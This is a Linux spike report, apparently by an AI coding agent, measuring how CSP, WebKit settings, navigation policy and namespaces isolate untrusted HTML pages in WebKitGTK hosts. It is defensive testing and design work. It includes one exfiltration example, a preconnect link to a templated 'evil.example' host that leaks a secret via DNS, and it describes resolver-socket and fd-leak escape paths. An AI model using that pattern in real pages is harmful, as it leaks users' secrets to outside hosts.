## Spike P1: both page hosts in the real WebKit webview (run 2026-10-18, Linux only)

Step P1 of `docs/plans/html-artifacts.md`. Linux half only; the macOS column is **not run** (`P1-MAC-RUN.md` has the steps and the Objective-C helper). Throwaway branch `spike/html-pages-p1` (worktree, never committed); `p1-spike.patch` is the whole diff.

**Environment.** Fedora, GNOME/Mutter on Wayland, WebKitGTK 4.1 **2.54.1**, GTK 3.24.52, libsoup 3.6.6, bwrap present, Go 1.27.1. Static host: `task studio:dev`-equivalent (`wails dev -tags webkit2_41,duckdb_arrow`, Wails v2.16.0) in the real window. One deviation: the static host ran under **XWayland (`GDK_BACKEND=x11`)** so that real pointer clicks could be injected with XTEST (no `xdotool`/`ydotool`/uinput here; a 60-line ctypes script, `click.py`, clicks the window centre). The frame is a full-viewport frame with a full-frame link, so the click lands on the link wherever the window sits. The scripted host ran on Wayland. WebKit's navigation and CSP logic is the same under both GDK backends.

**Method (as the base plan's Spike).** Ground truth is a loopback listener that logs every TCP accept, every HTTP request line and every UDP packet (`pagehost listener`, port 39547 for the static host; a fresh host listener per scripted run, or an in-namespace listener, see below), plus the Go log (`REQ` lines from the asset middleware, `IPC SpikeProbe` lines from a log-only binding). "Blocked" means no request reached any listener and nothing appeared in a Go line. A console error or CSP violation event is never counted. Every vector set was first run against a **control** (no CSP, no sandbox) to prove the vector fires and the instrument sees it. Raw logs: `SCRATCH/p1/logs/` (765 files; `A.*` = static host, `C*`/`P*`/`PV*` = scripted host matrix, one file set per vector group).

No command was refused by the auto-mode classifier except one `rm -f logs/*` (a glob after a `cd`, flagged as an unresolvable dangerous removal). I did not work around it: it only cleaned old test logs, which I left in place and overwrote per run instead.

**New finding for the static host: `<link rel="preconnect">` is not covered by any of this.** A page with `<link rel="preconnect" href="http://127.0.0.1:39547">` opens a TCP connection (and would resolve the host name first) even under H3 CSP + sandbox + a1 + narrow: `tcp-accept` followed by `tcp-noreq (connection with no request)` at 14:24:15 and 14:35:23. Pointing the link at a host name built from a template value (`https://{{.secret}}.evil.example`) is a script-less exfiltration channel of a few bytes a page, over DNS and the connect. A `target=_blank` click did the same (14:36:08). Individually tested hints: `dns-prefetch`, `prefetch`, `prerender`, `icon`, `stylesheet`, `preload`, `modulepreload` produced no connection under the policy (and `dns-prefetch`, `prefetch`, `prerender` and `icon` produced none even in the control, so WebKitGTK 2.54 ignores them). No CSP directive governs preconnect. The H2 template vet must therefore reject `<link rel=preconnect>` (allow only `rel=stylesheet` to `assets/`), `target` attributes and any templated value in a host position.

### B. Scripted host (H4): a helper process with its own WebKitGTK web view

`spike/pagehost/` is Go + cgo against WebKitGTK 4.1 directly (no Wails): `host.c` (web view, `vibe-page://` handler, `decide-policy`, settings), `helper.go` (pages, protocol, `vibe` API), `netsetup.go`/`listener.go` (in-namespace instruments), `main.go` (the parent standing in for Studio). The parent scrubs the environment, passes **one** extra fd (a socketpair, fd 3), sets `Pdeathsig`, optionally `CLONE_NEWUSER|CLONE_NEWNET`, runs a heartbeat watchdog and snapshots `/proc`.

**Layers were measured on their own**, each with a control that shows the vectors fire:

| Config | CSP | Settings | Policy | Namespace | Listener |
|---|---|---|---|---|---|
| C0 control | permissive | off (WebRTC, media, DNS prefetch, auditing explicitly *on*) | off | none | host loopback |
| C1a / C1b / C1c | strict (header) | off / on / on | off / off / **on** | none | host loopback |
| C1m | strict via `<meta>` only | on | off | none | host loopback |

#### What each layer does

1. **CSP alone (C1a/C1m, no policy, no namespace).** `webkit_uri_scheme_response_set_http_headers` **does honour `Content-Security-Policy` on a custom scheme** (C1a: header only, every `connect-src`, `img-src`, `style-src`, `font-src`, `script-src` vector blocked, 21 `securitypolicyviolation` events naming the directive; the meta-only run C1m behaves identically (also 21)). It blocks everything that loads a resource or submits a form. It does **not** block navigation (`location=`, `window.open`, `<a>.click()`, script-added `<meta refresh>` all reach the listener) and it does not govern `preconnect`.
2. **Settings (C1b vs C1c vs a permissive run with settings on).** Almost all of them do nothing observable here. `webkit_settings_set_enable_dns_prefetching` and `…_hyperlink_auditing` are **deprecated no-ops in 2.54** (GLib prints "is deprecated and does nothing"; `<a ping>` still POSTed with permissive CSP and the settings on). `enable-webrtc` defaults to FALSE and the API is absent anyway. What measurably works: `enable-media`/`enable-media-stream` off removes `navigator.mediaDevices`; `enable-html5-local-storage`/`-database` off removes `localStorage` and `indexedDB`. A permissive-CSP run with every setting on produced exactly the control's hit list.
3. **`decide-policy` + `create` + permission handlers (C1c).** Closes every navigation vector (`location`, `replace`, anchor click, `<meta refresh>`, `window.open`): zero hits. Navigation to another path on the same scheme (`vibe-page://app/other`) is refused; a same-page query link (`?g=samepage`) is allowed. Camera/microphone, geolocation and notification requests were logged and denied (`WebKitUserMediaPermissionRequest`, `WebKitGeolocationPermissionRequest`).
4. **Network namespace alone (C2, permissive CSP).** The host listener sees nothing for any vector, including the navigation ones. The same namespace with a reachable listener (P0) shows every vector fires, so the silence is the namespace, not an unexercised vector.
5. **All together (C3, P3).** Zero hits for every vector.

#### Findings that change the plan

- **The policy, CSP and settings do not stop DNS or the TCP connect.** P3d (strict CSP, settings on, `decide-policy` refusing the navigation, network namespace with a reachable resolver) still logged `pc-name.spike.test` for a `<link rel=preconnect>` and `alink-name.spike.test` for a *refused* link click, and an accepted connect with no request. WebKit resolves and connects regardless of the policy decision (the DNS query was logged 7 ms after the refusal). **Only the network gate can stop this.**
- **A network namespace alone does not stop DNS on this machine.** `/etc/nsswitch.conf` has `resolve`, which talks to `systemd-resolved` over `/run/systemd/resolve/io.systemd.Resolve`, a **path socket, which a network namespace does not isolate**. `connect()` to it succeeds inside `unshare -U -n` and inside `bwrap --unshare-net` (`nscheck.py`). With a fake varlink server mounted at that path (PV3d: strict CSP, settings, policy, user+net namespace), WebKit connected to it twice (`HIT varlink-connect`; name resolution lives in the network process, but I did not attribute the pid) for the preconnect and the refused click. On a real host those would be real DNS queries for attacker-chosen names. **Hiding the resolver is necessary but NOT sufficient.** `bwrap --unshare-net --tmpfs /run/systemd/resolve` makes that one connect fail with ENOENT (verified), but `/run/avahi-daemon/socket` and `/run/dbus/system_bus_socket` (which carries `org.freedesktop.resolve1`) still connect inside the namespace, and other distributions may expose nscd or sss sockets. A deny-list of known resolver sockets cannot be complete: the gate needs an **allow-listed filesystem view** (an empty root with only `/usr`, the Wayland socket and what WebKit needs bind-mounted, no `/run` or system bus). A bare `CLONE_NEWUSER|CLONE_NEWNET` from Go cannot do this (a user mapped to its own uid has no `CAP_SYS_ADMIN` to mount); either map root and drop, or use `bwrap` for the namespace job.
- **The session DBus and the Wayland socket stay reachable** from inside the namespace (path sockets: `connect` OK for both under `unshare -U -n` and bwrap). The helper itself keeps a session-bus path, which is how GTK reaches portals; WebKit's own web process gets only a filtered `xdg-dbus-proxy`. The abstract X11 socket does not work in a namespace (not a concern for Wayland).
- **The helper's protocol fd leaks into WebKit's processes unless it is `CLOEXEC`.** The socketpair passed as `ExtraFiles[0]` was inherited at fd 3 by **`WebKitNetworkProcess`, `xdg-dbus-proxy` and the sandboxed `WebKitWebProcess`** (same `socket:[…]` inode in `/proc/<pid>/fd`). Page code runs in that web process, so an exploit there would hold the parent's protocol socket. `syscall.CloseOnExec(3)` in the helper, right after start, removes it from every child (re-measured: only the helper holds the inode).
- **Killing the helper does not kill a spinning web process.** `while(true){}`: heartbeat missed for 2.006 s, the parent SIGKILLed the helper, the network process and most children exited, but **`WebKitWebProcess` and its two `bwrap` parents stayed alive at ~72% CPU** (still there when I looked; I killed them by hand). The fix works in both forms I tried: `Setpgid` and `kill(-pgid, SIGKILL)`, or `CLONE_NEWPID` (killing the helper, pid 1 of the namespace, kills all of it): zero orphans in both runs. A plain `kill(helper)` is not enough.
- **`webkit_web_context_set_sandbox_enabled(TRUE)` is what turns the web-process sandbox on.** Without the call (`-sandbox=false`): the getter returns 0, and the web process has `NoNewPrivs 0`, `Seccomp 0`, and the host's net/user/pid namespaces. With it: the web process runs under `bwrap --unshare-all`, in its **own user, pid and net namespaces**, `Seccomp 2`, `NoNewPrivs 1`, `CapEff 0`. `WebKitNetworkProcess` is **not** sandboxed in either case (`Seccomp 0`, same namespaces as the helper). So the web process has no network by itself; the helper's namespace is what gates the network process, which does the DNS and the connects.
- **`script-message-received` is delivered for frames too, so the handler cannot tell a frame from the page.** With permissive CSP and no policy, both a `srcdoc` frame and an `src=vibe-page://app/frame.html` frame posted to the handler (`posted-from-srcdoc`, `posted-from-frame-file`). Defences that work: CSP `frame-src 'none'` (strict run: `csp-violation frame-src vibe-page://app/frame.html`, no post) and `decide-policy` (permissive CSP + policy on: `navigation about:srcdoc allow=0`, no post). The `vibe` API itself is only injected into the top frame (`WEBKIT_USER_CONTENT_INJECT_TOP_FRAME`), but the handler object is not.
- **A custom-scheme response that sets `http_headers` must set `Content-Type` in them.** `webkit_uri_scheme_response_set_content_type` is ignored once headers are replaced; with `X-Content-Type-Options: nosniff` the script was silently not executed (HTML still loads). Adding `Content-Type` to the header set fixed it.
- **`document.title` cannot rename the native window.** The page set `Vibe Studio - Sign in`: the web view's title became that, the GTK window title stayed `Spike page host` (log line `H title doc.title=Vibe Studio - Sign in window.title=Spike page host`).

### Deviations from the plan's assumptions

1. **a1 is required for the static host, and the meta needs the real origin.** Without it a person's click on an outside link leaks (verified); narrowing works but depends on `location.origin` (`wails://wails.localhost:34115` in dev).
2. **The route's `Sec-Fetch-Dest` check never fires on WebKitGTK** (no `Sec-Fetch-*` headers were seen, but only at the `/vibe-view/` handler and the `/` and `/index.html` requests, which is all that was logged). Use the rate limit; `Accept` is a weak extra.
3. **`<link rel=preconnect>` and refused navigations connect and resolve** under every CSP/policy layer. The static host needs the template vet to forbid `<link rel=preconnect>` and `target`; the scripted host needs the network gate.
4. **Most `WebKitSettings` the plan lists are no-ops or absent** (DNS prefetching, hyperlink auditing deprecated; WebRTC not built). The settings layer is not a defence in 2.54.
5. **CSP does work as a header on a custom scheme**, but `Content-Type` must be in the same header set.
6. **The network namespace alone leaves DNS open on a `nss-resolve` host.** A resolver-hiding mount namespace is part of the gate.
7. **Environment list is `XDG_RUNTIME_DIR` (+ `WAYLAND_DISPLAY`)**, shorter than the plan expected; **root mapping breaks WebKit's `bwrap`** through `HOME=/root`.
8. **Four process-handling facts the plan lacked:** `CLOEXEC` on the protocol fd; kill the tree (process group or pid namespace), not the helper; `set_sandbox_enabled(TRUE)` is mandatory (default off); the network process is not sandboxed.
9. **Frames can post to the handler** (no frame information in the GTK signal); `frame-src 'none'` plus the policy are the whole defence.

### Recommended decisions

**Static host (H3): GO, with conditions.** It is as safe as the plan hoped for everything that loads or runs, and it works in the real window. Conditions: ship a1, narrowed to `frame-src <location.origin>/vibe-view/` and built at runtime; drop the `Sec-Fetch-Dest` plan item in favour of the 4-in-flight/60-a-minute rate limit; make the H2 template vet reject `<link>` other than a local stylesheet, `target=` and any templated value in a URL host position (script-less DNS/connect exfil via `preconnect` otherwise); keep `sandbox=""`, the H3 CSP, nosniff and no-store as designed.

**Scripted host (H4): GO on Linux only if the network gate is built as specified below; otherwise NO-GO.** CSP, settings and the navigation policy are necessary and are verified to close all fetch, form and navigation vectors, but none of them stops the DNS lookup and TCP connect that WebKit does before a policy decision, and the settings layer is mostly inert. The gate is a new user+net namespace **plus a hidden resolver** (`bwrap --unshare-net --tmpfs /run/systemd/resolve …`, or a Go clone with a mount-namespace step and a privileged mapping that is dropped before exec), with `CLOEXEC` on the pipe, tree-kill (process group or `CLONE_NEWPID`), `set_sandbox_enabled(TRUE)`, uid mapped to itself, the two-variable environment and `frame-src 'none'` + `decide-policy`. Prefer `bwrap` as the launcher when present, with an allow-listed filesystem view rather than a tmpfs over known sockets; fall back to refusing to open the page window where neither a user namespace nor `bwrap` is available. **The macOS half is not run; per the plan's rule the scripted host stays Linux-only until `P1-MAC-RUN.md` is done, and it is dropped on macOS if the `sandbox-exec` profile cannot be shown to cover the WebKit Networking process (see the warning in that file).**
